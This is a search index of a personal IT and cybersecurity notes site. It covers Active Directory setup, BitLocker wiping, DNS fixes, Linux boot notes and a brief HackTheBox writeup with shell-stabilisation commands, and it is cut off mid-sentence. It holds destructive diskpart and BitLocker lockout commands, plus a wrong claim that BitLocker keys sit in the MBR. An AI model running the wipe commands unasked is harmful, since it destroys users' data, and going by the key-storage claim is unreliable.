{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"WhoAmI","text":""},{"location":"#hi-im-lincoln-basnet","title":"Hi, I\u2019m Lincoln Basnet","text":"<p>Electronics Engineering graduate \u2022 IT Support \u2022 Networking \u2022 Linux \u2022 Cybersecurity</p> Browse Notes See Writeups"},{"location":"#what-i-do","title":"What I Do","text":"IT Support <p>Active Directory, BitLocker/TPM, and DNS troubleshooting.</p> Open AD Guide \u2192 Linux &amp; Systems <p>Boot process, filesystems, inodes, and practical Linux tips.</p> See Boot Process \u2192 Cybersecurity <p>Ethical hacking, recon, web app security, and CTF notes.</p> Start with Recon \u2192 Cloud <p>Cloud basics, AWS EventBridge, AWS Config, and CloudWatch Logs.</p> Begin Cloud Notes \u2192 Tools <p>Nmap usage, methodology, and handy assessment snippets.</p> Open Nmap Guide \u2192 Writeups <p>TryHackMe &amp; HackTheBox \u2014 step-by-step walkthroughs.</p> See HTB: Busqueda \u2192"},{"location":"#highlights","title":"Highlights","text":"<ul> <li>\ud83d\udee0\ufe0f IT Support: Active Directory, BitLocker/TPM, DNS troubleshooting, VPN troubleshooting </li> <li>\ud83e\udded Methodology: Practical workflows for recon and enumeration  </li> <li>\ud83d\udc27 Linux Deep Dives: Boot process, init, filesystems, inodes  </li> <li>\u2601\ufe0f Cloud: Cloud basics, EventBridge, Config, CloudWatch Logs  </li> <li>\ud83e\uddea Writeups: TryHackMe &amp; HackTheBox step-by-step notes</li> </ul> IT Support Linux Web Hacking Cloud Tools Writeups"},{"location":"#about-me","title":"About Me","text":"<p>I\u2019m an electronics engineering graduate with a strong interest in IT Support, Networking, Linux, Cloud, and Cybersecurity. I enjoy breaking down complex concepts into clear, useful notes and hands-on guides.</p> <p>If you\u2019d like to collaborate, feel free to reach out \u2014 my socials are in the footer.</p>"},{"location":"Important%20note/","title":"Important note","text":"<p>Read: https://docs.google.com/presentation/d/1xgvEScGZ_ukNY0rmfKz1JN0sn-CgZY_rTp2B_SZvijk/mobilepresent?slide=id.g4052c4692d_0_0</p> <p>Go to Github page: https://github.com/nahamsec</p> <p>Read: https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters</p> <p>Follow every bug hunter on Twitter. Follow all @bugbounties *</p> <p>Sign up on HackerOne\u2019s www.hacker101.com. Download the free web hacking 101 book. Follow every person on Twitter the book mentions.</p> <p>More excellent reads: https://www.hackingtutorials.org/infosec-books/the-best-hacking-books-2018/</p> <p>Read bug bounty blogs from BugCrowd, HackerOne, Tenable, Port Swigger, https://skeletonscribe.net (James Kettle), https://pentester.land/, etc</p> <p>https://portswigger.net/web-security/learning-path</p> <p></p>"},{"location":"Important%20note/#subdomain-takeover","title":"Subdomain takeover","text":"<ul> <li>https://0xpatrik.com/subdomain-takeover-basics/</li> <li>https://0xpatrik.com/subdomain-takeover-ns/</li> <li>https://nitter.snopyta.org/i/status/1416770928092975105</li> <li>https://github.com/tripmine253/pentest-book/wiki/subdomain-takeover</li> <li>https://github.com/EdOverflow/can-i-take-over-xyz</li> <li>https://github.com/indianajson/can-i-take-over-dns</li> </ul>"},{"location":"Important%20note/#pcampus-content","title":"pcampus content:","text":"<p>https://github.com/PCampus-InfoSec-Enthusiasts/learning-resources</p>"},{"location":"Important%20note/#some-tryhackme-rooms-to-try","title":"some tryhackme rooms to try","text":"<p>Linux Agency room</p>"},{"location":"Important%20note/#others","title":"others","text":"<p>nmap -p- --min-rate=10000</p> <pre><code>nmap -p- --min-rate=1000 10.10.12.12\n</code></pre> <p>feroxbuster recon like gobuster</p>"},{"location":"IT%20Support/Active%20Directory/","title":"Active Directory","text":"<p>This guide walks you through the installation and configuration of Active Directory Domain Services (AD DS) using the Server Manager GUI. We\u2019ll cover everything from naming your machine (e.g., <code>mat-lap-001</code>) to creating users (like <code>lincoln.basnet</code>), building Organizational Units, and delegating rights \u2014 with clear, step-by-step instructions.</p>"},{"location":"IT%20Support/Active%20Directory/#core-concepts-of-active-directory","title":"\ud83e\udde0 Core Concepts of Active Directory","text":""},{"location":"IT%20Support/Active%20Directory/#forest","title":"\ud83c\udf33 Forest","text":"<ul> <li>A forest is the highest-level container in Active Directory.</li> <li>It acts as a security boundary, defining trust boundaries.</li> <li>A forest can contain one or more domains that trust each other.</li> <li>Installing AD DS for the first time creates a new forest.</li> </ul> <p>Example: Installing AD DS with the root domain <code>matrix.com.np</code> creates the Matrix Forest.</p>"},{"location":"IT%20Support/Active%20Directory/#domain","title":"\ud83c\udfe0 Domain","text":"<ul> <li>A domain is a logical group of objects (users, computers, printers, etc.) inside a forest.</li> <li>Objects in a domain share the same database, security policies, and trust relationships.</li> <li>Each domain is managed by domain controllers.</li> </ul> <p>Example: In the forest <code>matrix.com.np</code>, the domain is also <code>matrix.com.np</code>.</p>"},{"location":"IT%20Support/Active%20Directory/#organizational-unit-ou","title":"\ud83c\udfe2 Organizational Unit (OU)","text":"<ul> <li>An Organizational Unit (OU) is a container inside a domain used to group and manage AD objects.</li> <li>OUs let you organize users, computers, and groups logically (e.g., <code>Sales</code>, <code>HR</code>).</li> <li>OUs are essential for applying Group Policies and delegating administration.</li> </ul> <p>Example: Create an OU called <code>Sales</code> and place all sales department accounts inside it.</p>"},{"location":"IT%20Support/Active%20Directory/#domain-controller-dc","title":"\ud83d\udc51 Domain Controller (DC)","text":"<ul> <li>A Domain Controller is a server running AD DS that handles:</li> <li>User logins  </li> <li>Authentication  </li> <li>Access control  </li> <li>Directory lookups  </li> <li>Every DC keeps a copy of the AD database, synchronized across all DCs in the domain.</li> </ul>"},{"location":"IT%20Support/Active%20Directory/#local-domain-controller","title":"\ud83d\udda5\ufe0f Local Domain Controller","text":"<ul> <li>A Local DC is another domain controller installed at a branch office.</li> <li>It ensures logins and directory services remain available even if the main site is offline.</li> <li>Useful in multi-office or geographically distributed organizations.</li> </ul>"},{"location":"IT%20Support/Active%20Directory/#prerequisites","title":"\ud83e\uddd1\u200d\ud83d\udcbb Prerequisites","text":"<p>Before installing Active Directory, make sure you have: - A freshly installed Windows Server (2016 or later). - A computer named <code>mat-lap-001</code>. - Static IP configuration set. - Administrator access.  </p>"},{"location":"IT%20Support/Active%20Directory/#installing-active-directory-gui-method","title":"\ud83c\udfd7\ufe0f Installing Active Directory (GUI Method)","text":""},{"location":"IT%20Support/Active%20Directory/#step-1-rename-computer-set-ip","title":"\u2705 Step 1: Rename Computer &amp; Set IP","text":"<ol> <li>Go to Control Panel &gt; System &gt; Change settings.  </li> <li>Rename the computer to <code>mat-lap-001</code>.  </li> <li>Open Network and Sharing Center &gt; Change adapter settings.  </li> <li>Right-click Ethernet \u2192 Properties.  </li> <li>Select <code>IPv4</code> \u2192 Set a static IP, subnet mask, and gateway.  </li> </ol>"},{"location":"IT%20Support/Active%20Directory/#step-2-add-ad-ds-role","title":"\u2705 Step 2: Add AD DS Role","text":"<ol> <li>Open Server Manager.  </li> <li>Click Add Roles and Features.  </li> <li>Choose:</li> <li>Role-based or feature-based installation </li> <li>Select your server (<code>mat-lap-001</code>)  </li> <li>Under Server Roles, check:  </li> <li>\u2705 Active Directory Domain Services </li> <li>Add required features when prompted.  </li> <li>Click Next and then Install.  </li> </ol>"},{"location":"IT%20Support/Active%20Directory/#step-3-promote-server-to-domain-controller","title":"\u2705 Step 3: Promote Server to Domain Controller","text":"<ol> <li>After installation, click Promote this server to a domain controller.  </li> <li>Select Add a new forest \u2192 Enter root domain name: <code>matrix.com.np</code>.  </li> <li>Set a DSRM (Directory Services Restore Mode) password.  </li> <li>Accept default DNS options.  </li> <li>Accept default paths for:  </li> <li>Database folder  </li> <li>Log files  </li> <li>SYSVOL  </li> <li>Review and click Install.  </li> <li>The server will reboot automatically.  </li> </ol>"},{"location":"IT%20Support/Active%20Directory/#creating-organizational-units-and-users","title":"\ud83d\udc65 Creating Organizational Units and Users","text":""},{"location":"IT%20Support/Active%20Directory/#step-1-create-an-ou","title":"\u2705 Step 1: Create an OU","text":"<ol> <li>Open Active Directory Users and Computers (<code>dsa.msc</code>).  </li> <li>Right-click domain <code>matrix.com.np</code> \u2192 New &gt; Organizational Unit.  </li> <li>Name the OU (e.g., <code>Sales</code>).  </li> </ol>"},{"location":"IT%20Support/Active%20Directory/#step-2-create-a-user","title":"\u2705 Step 2: Create a User","text":"<ol> <li>Right-click the OU (<code>Sales</code>) \u2192 New &gt; User.  </li> <li>Enter details:  </li> <li>First name: <code>Lincoln</code> </li> <li>Last name: <code>Basnet</code> </li> <li>User logon: <code>lincoln.basnet</code> </li> <li>Set a password and user options.  </li> </ol>"},{"location":"IT%20Support/Active%20Directory/#delegating-rights-delegation-of-control","title":"\ud83d\udd10 Delegating Rights (Delegation of Control)","text":"<p>You can delegate control so non-admin users (e.g., <code>lincoln.basnet</code>) can manage accounts within an OU.</p>"},{"location":"IT%20Support/Active%20Directory/#steps-to-delegate-control","title":"\u2705 Steps to Delegate Control","text":"<ol> <li>Open Active Directory Users and Computers.  </li> <li>Right-click the OU (e.g., <code>Sales</code>) \u2192 Delegate Control.  </li> <li>The wizard opens \u2192 Click Next.  </li> <li>Click Add \u2192 Type <code>lincoln.basnet</code> \u2192 OK \u2192 Next.  </li> <li>Choose tasks to delegate, such as:  </li> <li>\u2705 Create, delete, and manage user accounts  </li> <li>\u2705 Reset user passwords and force password changes  </li> <li>Click Next \u2192 Finish.  </li> </ol> <p>\u2705 Now <code>lincoln.basnet</code> can manage users inside the <code>Sales</code> OU without needing domain admin rights.</p>"},{"location":"IT%20Support/Bitlocker%20Encryption/","title":"BitLocker Encryption","text":""},{"location":"IT%20Support/Bitlocker%20Encryption/#1-enable-full-disk-encryption-with-bitlocker","title":"1. Enable Full-Disk Encryption with BitLocker","text":"<ul> <li>Open Manage BitLocker via Control Panel.</li> <li>Select the OS drive (<code>C:</code>) and click Turn on BitLocker.</li> <li>Choose an unlock method (password or USB key).</li> <li>Save the recovery key securely.</li> <li>Select \"Encrypt entire drive\" and \"New encryption mode\".</li> <li>Start the encryption process.</li> </ul>"},{"location":"IT%20Support/Bitlocker%20Encryption/#2-forgetting-the-encryption-key","title":"2. Forgetting the Encryption Key","text":"<ul> <li>Delete the BitLocker recovery key:</li> <li>From Microsoft account or printout.</li> <li>From USB storage (if applicable).</li> <li>Forget the password:</li> <li>Once the key is lost, data becomes irrecoverable.</li> </ul>"},{"location":"IT%20Support/Bitlocker%20Encryption/#3-securely-erase-the-encrypted-disk","title":"3. Securely Erase the Encrypted Disk","text":""},{"location":"IT%20Support/Bitlocker%20Encryption/#option-1-delete-recovery-key","title":"Option 1: Delete Recovery Key","text":"<ul> <li>Remove from your Microsoft account or USB drive.</li> </ul>"},{"location":"IT%20Support/Bitlocker%20Encryption/#option-2-lock-bitlocker-without-decrypting","title":"Option 2: Lock BitLocker Without Decrypting","text":"<ul> <li>Open Command Prompt as Administrator.</li> <li>Run:   <pre><code>manage-bde -forcerecovery C:\n</code></pre></li> </ul>"},{"location":"IT%20Support/Bitlocker%20Encryption/#option-3-wipe-the-disk","title":"Option 3: Wipe the Disk","text":"<ul> <li>Boot from Windows Installation Media.</li> <li>Open Command Prompt from recovery options.</li> <li>Use DiskPart:   <pre><code>diskpart\nlist disk\nselect disk 0\nclean\n</code></pre>   This will erase the data from the disk completely.</li> </ul>"},{"location":"IT%20Support/Bitlocker%20Encryption/#option-4-reformat-the-ssd","title":"Option 4: Reformat the SSD","text":"<ul> <li>After wiping, create new partitions and format the SSD:   <pre><code>create partition primary\nformat fs=ntfs quick\nassign\nexit\n</code></pre></li> </ul>"},{"location":"IT%20Support/Bitlocker%20Encryption/#4-check-bitlocker-encryption-status","title":"4. Check BitLocker Encryption Status","text":""},{"location":"IT%20Support/Bitlocker%20Encryption/#option-1-control-panel","title":"Option 1: Control Panel","text":"<ul> <li>Open Manage BitLocker to check encryption status.</li> </ul>"},{"location":"IT%20Support/Bitlocker%20Encryption/#option-2-command-prompt","title":"Option 2: Command Prompt","text":"<ul> <li>Open Command Prompt as Administrator.</li> <li>Run:   <pre><code>manage-bde -status\n</code></pre></li> </ul>"},{"location":"IT%20Support/Bitlocker%20Encryption/#option-3-file-explorer-non-os-drives","title":"Option 3: File Explorer (Non-OS Drives)","text":"<ul> <li>Look for a lock icon on encrypted drives.</li> </ul>"},{"location":"IT%20Support/Bitlocker%20Encryption/#option-4-unlock-drive-if-required","title":"Option 4: Unlock Drive (If Required)","text":"<ul> <li>If prompted for a password or USB key, provide it to unlock the drive.</li> </ul>"},{"location":"IT%20Support/Bitlocker%20Encryption/#5-disable-bitlocker-without-tpm-if-applicable","title":"5. Disable BitLocker without TPM (if applicable)","text":""},{"location":"IT%20Support/Bitlocker%20Encryption/#enable-group-policy-for-bitlocker-without-tpm","title":"Enable Group Policy for BitLocker without TPM","text":"<ul> <li>Open Group Policy Editor:   <pre><code>gpedit.msc\n</code></pre></li> <li>Navigate to:   <pre><code>Computer Configuration &gt; Administrative Templates &gt; Windows Components &gt; BitLocker Drive Encryption &gt; Operating System Drives\n</code></pre></li> <li>Enable \"Require additional authentication at startup\" and check \"Allow BitLocker without a compatible TPM\".</li> <li>Run:   <pre><code>manage-bde -on C: -password\n</code></pre></li> </ul>"},{"location":"IT%20Support/Bitlocker%20Encryption/#6-important-notes","title":"6. Important Notes","text":"<ul> <li>Once BitLocker is enabled and the key is deleted, the data is irrecoverable.</li> <li>The drive can be reused after formatting.</li> <li>Backup the recovery key before starting the encryption process.</li> </ul>"},{"location":"IT%20Support/Bitlocker%20and%20TPM/","title":"BitLocker and TPM","text":""},{"location":"IT%20Support/Bitlocker%20and%20TPM/#overview-of-tpm-and-bitlocker-integration","title":"Overview of TPM and BitLocker Integration","text":"<ul> <li>TPM is a hardware chip integrated into most modern computers that provides secure storage for cryptographic keys, including the BitLocker recovery key.</li> <li>When BitLocker is enabled on a system, the TPM plays a crucial role in protecting the encryption keys used for full disk encryption.</li> </ul>"},{"location":"IT%20Support/Bitlocker%20and%20TPM/#how-is-bitlocker-key-stored-in-tpm","title":"How is BitLocker Key Stored in TPM","text":"<ol> <li>Encryption Key Protection</li> <li>When BitLocker is activated, the BitLocker encryption key (which is used to encrypt the entire disk) is encrypted and stored within the TPM.</li> <li> <p>The TPM generates a Volume Master Key (VMK), which is a unique key that is used to encrypt the BitLocker drive. This key is encrypted and stored securely within the TPM.</p> </li> <li> <p>Key Sealing</p> </li> <li>The BitLocker key is sealed within the TPM, which means it is tied to the specific configuration of the system, such as the system\u2019s boot environment, BIOS/UEFI, and the TPM\u2019s own internal state.</li> <li> <p>Sealing ensures that the key cannot be accessed if the system\u2019s configuration changes or if tampering with the hardware or firmware is detected.</p> </li> <li> <p>Access Control</p> </li> <li>The TPM ensures that the BitLocker key is only released if the system\u2019s integrity is verified. This includes ensuring the correct boot sequence and that no unauthorized changes have occurred.</li> <li> <p>The key is not stored in plaintext, and it is only released when the system boots and the TPM verifies the system's health, ensuring that it hasn\u2019t been tampered with.</p> </li> <li> <p>Key Retrieval During Boot</p> </li> <li>When the system boots, the TPM verifies the integrity of the early boot environment (including the bootloader and kernel) before releasing the BitLocker key.</li> <li>Once the TPM verifies that the system is trusted (e.g., no unauthorized changes to the boot process), it decrypts the BitLocker key and allows the operating system to decrypt the disk.</li> </ol>"},{"location":"IT%20Support/Bitlocker%20and%20TPM/#summary-of-the-process","title":"Summary of the Process","text":"<ol> <li>BitLocker is enabled, and the TPM generates and encrypts the Volume Master Key (VMK).</li> <li>The VMK is sealed within the TPM to ensure security.</li> <li>Upon boot, the TPM verifies system integrity.</li> <li>If the system is verified as trusted, the TPM releases the key to unlock the disk.</li> </ol> <p>Note: If the TPM detects any changes in the system (e.g., hardware changes, BIOS/UEFI modifications), it will prevent the key from being released, which could trigger a BitLocker recovery prompt for user intervention.</p>"},{"location":"IT%20Support/Bitlocker%20and%20TPM/#key-takeaways","title":"Key Takeaways","text":"<ul> <li>The BitLocker encryption key is securely stored and managed by the TPM.</li> <li>TPM ensures the key is only accessible if the system is verified as trusted and untampered with.</li> <li>TPM enhances the security of BitLocker by providing a hardware-based layer of protection.</li> </ul>"},{"location":"IT%20Support/Bitlocker%20and%20TPM/#why-accessing-data-is-irrecoverable","title":"Why accessing data is irrecoverable","text":"<p>When you run the <code>clean</code> command in DiskPart, it erases all partitions and removes the file system from the drive, making it impossible to access the encrypted data. BitLocker encryption relies on encryption keys stored within the partition table or the Master Boot Record (MBR), which are tied to the specific partition structure. Since <code>clean</code> completely wipes the partition table and MBR, all of this encryption metadata is erased along with the partitions themselves. Without this crucial information, the encrypted data becomes unreadable and impossible to decrypt, as the keys required to unlock the data are no longer available.</p> <p>Even if forensic recovery tools attempt to recover the data, they cannot access the encrypted information without the partition structure and encryption keys. The <code>clean</code> command essentially resets the disk to a blank state, where no trace of the previous encryption exists. While it's possible that some residual data may remain at the physical level, the lack of partition metadata and encryption keys ensures that the encrypted data remains irrecoverable. The drive is left in a state where no tool or method can reverse the encryption or access the original information.</p>"},{"location":"IT%20Support/DNS%20Troubleshooting/","title":"DNS Troubleshooting","text":""},{"location":"IT%20Support/DNS%20Troubleshooting/#how-to-resolve-domain-issues-in-windows","title":"How to resolve domain issues in windows?","text":"<p>Resolving DNS issue requires steps by steps understanding of all the DNS processes and DNS records in windows system. Fixing DNS issue usually requires resetting the dns cache, reconfiguring the DNS resolver and more.</p> <p>How to view dns cache in Windows:  ````  ipconfig /displaydns `````</p> <ul> <li>This command lists all cached DNS records stored on your system.</li> <li>It includes entries for recently visited websites.</li> </ul>"},{"location":"IT%20Support/DNS%20Troubleshooting/#where-is-the-cache-stored","title":"Where is the Cache Stored?","text":"<ul> <li>The DNS cache is stored in memory, not in a file.</li> <li>Windows manages it through the DNS Client Service (<code>dnscache</code>).</li> <li>When you flush the cache (<code>ipconfig /flushdns</code>), it gets cleared from RAM.</li> </ul>"},{"location":"IT%20Support/DNS%20Troubleshooting/#common-dns-fixes","title":"Common DNS fixes","text":"<p>1. Restart Your Router and Computer How it helps: - Clears temporary network glitches. - Re-establishes connection to your ISP\u2019s DNS servers. - Resets the IP address assignment if there\u2019s a conflict.</p> <p>2. Flush DNS Cache How it helps: - Clears outdated or incorrect DNS records stored in your system. - Ensures that your computer fetches fresh DNS data from servers.</p> <p>3. Reset Network Settings <pre><code>netsh int ip reset\nnetsh winsock reset\n</code></pre> How it helps: - Resets all network-related settings to default. - Fixes corrupted network configurations that might be blocking DNS resolution. - The <code>winsock reset</code> command restores default settings for handling internet connections.</p> <p>4. Restart DNS Client Service <pre><code>net stop dnscache\nnet start dnscache\n</code></pre> How it helps: - The DNS Client Service stores DNS lookups for faster browsing. - If it gets stuck or corrupt, restarting the service forces a refresh, solving connectivity issues.</p>"},{"location":"IT%20Support/DNS%20Troubleshooting/#how-the-netsh-command-works","title":"How the <code>netsh</code> Command Works","text":"<p><code>netsh</code> (Network Shell) is a command-line utility that allows you to manage network settings in Windows.</p>"},{"location":"IT%20Support/DNS%20Troubleshooting/#key-features-of-netsh","title":"Key Features of <code>netsh</code>","text":"<ul> <li>Configures network interfaces, IP addresses, and firewall settings.</li> <li>Works in interactive mode (<code>netsh</code> alone) or directly executes commands.</li> <li>Helps troubleshoot and reset network configurations.</li> </ul>"},{"location":"IT%20Support/DNS%20Troubleshooting/#what-is-winsock-reset","title":"What is <code>winsock reset</code>?","text":"<p>The <code>winsock reset</code> command resets the Windows Sockets (Winsock) Catalog, which controls how Windows handles network requests.</p>"},{"location":"IT%20Support/DNS%20Troubleshooting/#how-it-works","title":"How it Works:","text":"<ul> <li>Winsock (Windows Sockets API) manages communication between Windows programs and network services.</li> <li>Sometimes, malware or software changes can corrupt Winsock settings, causing:<ul> <li>No internet access.</li> <li>DNS resolution failures.</li> <li>Issues with network-dependent applications (browsers, email clients).</li> </ul> </li> <li>Resetting Winsock removes all custom configurations and restores default settings.</li> </ul>"},{"location":"IT%20Support/DNS%20Troubleshooting/#when-to-use-it","title":"When to Use It:","text":"<ul> <li>If you see errors like \"Limited connectivity\" or \"Unable to resolve DNS\".</li> <li>If specific apps can\u2019t connect to the internet.</li> <li>After removing malware that may have modified network settings.</li> </ul>"},{"location":"IT%20Support/DNS%20Troubleshooting/#netsh-int-ip-reset-command-explained","title":"<code>netsh int ip reset</code> Command Explained","text":"<pre><code>netsh int ip reset\n</code></pre>"},{"location":"IT%20Support/DNS%20Troubleshooting/#how-it-works_1","title":"How It Works:","text":"<p>This command resets TCP/IP settings to their default state. It:</p> <ol> <li>Deletes and reinstalls the TCP/IP stack in Windows.</li> <li>Removes all custom network configurations (like static IPs or DNS settings).</li> <li>Fixes issues caused by corrupted TCP/IP settings, such as:<ul> <li>Slow or no internet connection.</li> <li>\"No valid IP configuration\" errors.</li> <li>Issues after a network driver update.</li> </ul> </li> </ol>"},{"location":"IT%20Support/DNS%20Troubleshooting/#what-exactly-does-it-reset","title":"What Exactly Does It Reset?","text":"<ul> <li>Registry keys related to TCP/IP:    The command modifies and resets registry entries under: <pre><code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DHCP\\Parameters\\\n</code></pre></li> <li> <p>Resets all network adapters:</p> </li> <li> <p>If any adapter is misconfigured, this resets it.</p> </li> <li>To check adapters before and after reset: <pre><code>netsh interface show interface\n</code></pre></li> <li>Clears DHCP configurations:<ul> <li>If your system is failing to get an IP from the router, this helps.</li> </ul> </li> <li>Removes custom DNS settings:<ul> <li>If an incorrect DNS was set, this restores the default automatic setting.</li> </ul> </li> </ul>"},{"location":"IT%20Support/DNS%20Troubleshooting/#when-to-use-it_1","title":"When to Use It:","text":"<ul> <li>If changing DNS servers doesn\u2019t fix connection issues.</li> <li>If websites don\u2019t resolve, even after a cache flush.</li> <li>If your computer has \"Unidentified Network\" errors.</li> </ul>"},{"location":"IT%20Support/DNS%20Troubleshooting/#after-running-it-what-should-you-do","title":"After Running It, What Should You Do?","text":"<ol> <li>Restart your computer.</li> <li>If using static IP/DNS settings, reconfigure them (it resets them).</li> <li>Test your internet connection.</li> </ol>"},{"location":"IT%20Support/DNS%20Troubleshooting/#how-to-resolve-domain-issues-in-ubuntu","title":"How to resolve domain issues in Ubuntu?","text":""},{"location":"IT%20Support/DNS%20Troubleshooting/#1-restart-network","title":"1. Restart Network","text":"<pre><code>sudo systemctl restart NetworkManager\n</code></pre> <p>How it helps: - Refreshes network connections. - Fixes issues caused by misconfigured network settings. - Useful when switching from wired to wireless or vice versa.</p>"},{"location":"IT%20Support/DNS%20Troubleshooting/#2-flush-dns-cache","title":"2. Flush DNS Cache","text":"<p><pre><code>sudo systemd-resolve --flush-caches\nsudo resolvectl flush-caches\n</code></pre> How it helps: - Clears stored DNS records that might be outdated. - Forces the system to request fresh DNS data. - Fixes problems where websites don\u2019t load after a domain's IP address changes.</p>"},{"location":"IT%20Support/DNS%20Troubleshooting/#3-change-dns-server","title":"3. Change DNS Server","text":"<p>How it helps: - Works the same as in Windows\u2014switching to a public DNS server can improve speed, reliability, and security. - If your ISP\u2019s DNS is unreliable, setting <code>8.8.8.8</code> (Google) or <code>1.1.1.1</code> (Cloudflare) ensures a better connection.</p>"},{"location":"IT%20Support/DNS%20Troubleshooting/#4-use-networkmanager-to-set-dns","title":"4. Use NetworkManager to Set DNS","text":"<p><pre><code>nm-connection-editor\n</code></pre> How it helps:</p> <ul> <li>NetworkManager controls network connections in many Linux distributions.</li> <li>Manually setting a DNS server ensures that even after a reboot, your system uses a reliable DNS.</li> </ul>"},{"location":"IT%20Support/DNS%20Troubleshooting/#5-restart-systemd-resolver","title":"5. Restart Systemd Resolver","text":"<p><pre><code>sudo systemctl restart systemd-resolved\n</code></pre> How it helps:</p> <ul> <li><code>systemd-resolved</code> is a service that manages DNS queries in modern Ubuntu versions.</li> <li>Restarting it fixes situations where it's stuck or misconfigured.</li> <li>Helps when DNS resolution is slow or failing randomly.</li> </ul>"},{"location":"hackthebox/busqueda/","title":"Busqueda","text":"<p>now updating the /etc/hosts on the by adding the  ip address searcher.htb allows browser opening</p> <p>nmap results </p> <p>running a gobuster returns  /search</p> <p>on the bottom of the website listed as : made with flask and searcher 2.4.0  searching the searcher 2.4.0 gives github pages related to the exploit regarding searcher 2.4.0 running the exploit returns shell </p> <p>and just stabilised the shel python3 -c 'import pty;pty.spawn(\"/bin/bash\")' export TERM=xterm control +z  stty raw -echo &amp;&amp; fg</p> <p>cd'ed to ~ cat user.txt and returned me the user flag</p> <p>privilege escalation</p> <p></p> <p>ss -ltnp for running process got the json base64 decoded file </p> <p>{\"name\":\"Gitea: Git with a cup of tea\",\"short_name\":\"Gitea: Git with a cup of tea\",\"start_url\":\"http://gitea.searcher.htb/\",\"icons\":[{\"src\":\"http://gitea.searcher.htb/assets/img/logo.png\",\"type\":\"image/png\",\"sizes\":\"512x512\"},{\"src\":\"http://gitea.searcher.htb/assets/img/logo.svg\",\"type\":\"image/svg+xml\",\"sizes\":\"512x512\"}]}</p>"},{"location":"linux/Boot%20Process/","title":"Linux Boot Process","text":"<p>To truly understand the Linux boot process, we first need to be familiar with the hardware components that make up a PC. Let\u2019s start by exploring the structure of a hard disk drive (HDD).</p>"},{"location":"linux/Boot%20Process/#hard-disk-drive","title":"Hard Disk Drive","text":"<p>In the past, the terms disk and drive referred to separate components. The disk is where data is stored, while the drive is the mechanism that moves the read/write head to the correct sector.</p> <p></p> <p>The arm of the drive contains the read/write head, which writes data in blocks onto specific sectors. The circular components are called platters, which spin at high speeds. Each platter has its own read/write arm. To better understand how data is stored, we need to examine tracks and sectors.</p> <p>The concentric rings on a platter are called tracks. Each track is divided into smaller units known as sectors, where the actual data resides. Data is stored in blocks of 512 bytes. On MBR-based systems, the first sector of track 0 stores the Master Boot Record (MBR). Newer systems use the more advanced GUID Partition Table (GPT). In this section, we\u2019ll focus on MBR to explain the boot process, and later discuss GPT.</p> <p></p>"},{"location":"linux/Boot%20Process/#reading-and-writing-information-to-the-disk","title":"Reading and Writing Information to the Disk","text":"<p>Writing data to a disk is a time-consuming process because the disk arm must physically move to the appropriate track and sector. There are three important time factors involved:</p> <ul> <li>Seek time \u2013 the time it takes for the disk head to reach the correct track.  </li> <li>Transfer time \u2013 the time it takes to transfer a block of data.  </li> <li>Rotational latency \u2013 the delay caused by waiting for the platter to rotate to the correct position.  </li> </ul>"},{"location":"linux/Boot%20Process/#how-linux-handles-the-disk","title":"How Linux Handles the Disk","text":"<p>Linux categorizes devices into two main types: character devices and block devices.</p> <ul> <li>Character devices handle data one character at a time (e.g., mouse, keyboard, terminal).  </li> <li>Block devices store and transfer data in blocks (e.g., hard disk drives).  </li> </ul> <p>All device files are stored in the <code>/dev</code> directory. Each disk partition is also represented as a separate file under <code>/dev</code>. Every device requires a device driver, which communicates with the Linux kernel through system calls such as <code>open()</code>, <code>close()</code>, <code>read()</code>, <code>write()</code>, <code>ioctl()</code>, and <code>mmap()</code>. Each device is uniquely identified by major and minor numbers, which the kernel uses to locate the correct driver.</p>"},{"location":"linux/Boot%20Process/#disk-partitioning","title":"Disk Partitioning","text":"<p>A disk partition is a logical division of a hard disk where filesystems, swap areas, and data regions reside. MBR and GPT define how many partitions can be created and how they are structured.</p>"},{"location":"linux/Boot%20Process/#file-system","title":"File System","text":"<p>A file system is an organized collection of files and directories. Examples include Microsoft\u2019s FAT and NTFS, and Linux journaling file systems such as Btrfs and XFS.</p> <p></p> <p>A disk is divided into multiple partitions, and each partition can hold its own filesystem. A filesystem typically consists of:</p> <ul> <li>Boot block \u2013 contains boot code (present on all partitions, even if they aren\u2019t bootable).  </li> <li>Superblock \u2013 stores metadata, including the size of the inode table, logical blocks, and data blocks.  </li> <li>Inode table \u2013 a critical structure that maintains metadata about files and directories. For example, when you double-click a directory in a GUI, the system uses the inode entry to check permissions and locate files.  </li> <li>Data blocks \u2013 where the actual data is stored.  </li> </ul>"},{"location":"linux/Boot%20Process/#putting-it-all-together-the-boot-process","title":"Putting It All Together: The Boot Process","text":"<p>The Linux boot process begins the moment you press the power button:</p> <ol> <li>BIOS/UEFI Initialization \u2013 The BIOS (stored in ROM) runs the Power-On Self Test (POST), checking hardware and I/O connections.  </li> <li>Loading the MBR \u2013 BIOS loads the MBR from the disk. The MBR contains:  </li> <li>Disk signature \u2013 identifies the bootable disk (if multiple disks exist).  </li> <li>Partition table \u2013 describes how partitions are laid out.  </li> <li>Master boot code \u2013 responsible for loading the bootloader into memory.  </li> <li>Bootloader (GRUB2) \u2013 The master boot code loads GRUB2, the bootloader, into memory.  </li> <li>Kernel Loading \u2013 GRUB2 loads the compressed Linux kernel image (<code>vmlinuz</code>) from the <code>/boot</code> directory into RAM.  </li> <li>System Initialization (systemd) \u2013 Once the kernel is running, it starts systemd (process ID 1), the parent of all other processes. Systemd initializes the system by setting the hostname, starting services, configuring the network, and more.  </li> <li>Older systems used SysVinit, but modern Linux distributions rely on systemd.  </li> <li> <p>Previous systems used runlevels (e.g., single-user, multi-user, graphical). Today, systemd replaces them with targets:  </p> </li> <li> <p>Runlevel 0 \u2192 <code>poweroff.target</code> </p> </li> <li>Runlevel 3 \u2192 <code>multi-user.target</code> </li> <li> <p>Runlevel 5 \u2192 <code>graphical.target</code> </p> </li> <li> <p>Login Screen \u2013 After initialization, the system presents the login screen, ready for user access.  </p> </li> </ol> <p></p>"},{"location":"linux/Inode/","title":"Inode in Linux","text":"<p>Each partition in a filesystem contains an inode table, which stores information about files and directories. In the previous Boot Process of Linux document, I briefly mentioned partitions and their components. Here, we will focus more deeply on inodes and related concepts.</p> <p>One of the functions of a superblock is to store the size of the inode table. The superblock also contains the location of the inode for the root (<code>/</code>) directory.</p> <p>An inode table typically 